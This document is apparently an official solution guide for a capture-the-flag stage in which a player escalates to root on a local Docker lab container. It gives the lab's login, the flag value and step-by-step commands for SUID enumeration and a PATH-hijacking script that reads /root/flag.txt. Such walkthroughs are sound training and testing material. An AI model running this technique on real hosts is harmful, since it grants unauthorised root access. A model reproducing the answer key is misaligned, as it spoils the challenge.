# Stage 7: Production Host Privilege Escalation
## Official Exploitation Solution Guide

---

### 📋 Challenge Summary
- **Stage Number:** Stage 7
- **Challenge Name:** Production Host Privilege Escalation
- **Domain:** Linux Host Security / PrivEsc
- **Difficulty:** Moderate-Hard
- **Points:** 350 XP
- **Target Subsystem:** NexaCorp Bastion Host (`NEXA-ROOT-07`)
- **Port:** SSH on port `2227`
- **Initial Credentials:** `player` : `password123`
- **Official Flag:** `SHADOWNET{linux_a8eafa5848a204be0958d232f9e83ed9}`

---

### 🚀 Starting the Target (When Ready to Play)
```bash
# Start Stage 7 target container
docker compose -f stages/stage7-linux-security/docker-compose.yml up -d

# Connect via SSH
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2227 player@localhost
# Password: password123
```

---

### 🔍 Step-by-Step Exploitation

#### Step 1: Enumerate SUID Executables
Inside the SSH session as `player`:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Output reveals custom binary:
```text
/usr/local/bin/nexa-backup
```

#### Step 2: Analyze Binary Execution
Run strings or execute the binary:
```bash
strings /usr/local/bin/nexa-backup
```
Notice that it invokes `df -h` without an absolute path (`/bin/df`).

#### Step 3: Exploit Relative PATH Hijacking
Create a malicious `df` script in `/tmp`:
```bash
echo '#!/bin/bash' > /tmp/df
echo '/bin/cat /root/flag.txt' >> /tmp/df
chmod +x /tmp/df

# Prepend /tmp to PATH and execute the SUID binary
export PATH=/tmp:$PATH
/usr/local/bin/nexa-backup
```

#### Step 4: Capture the Flag
Output prints:
```text
SHADOWNET{linux_a8eafa5848a204be0958d232f9e83ed9}
```

---

### 🛑 Stopping the Target
```bash
docker compose -f stages/stage7-linux-security/docker-compose.yml down
```

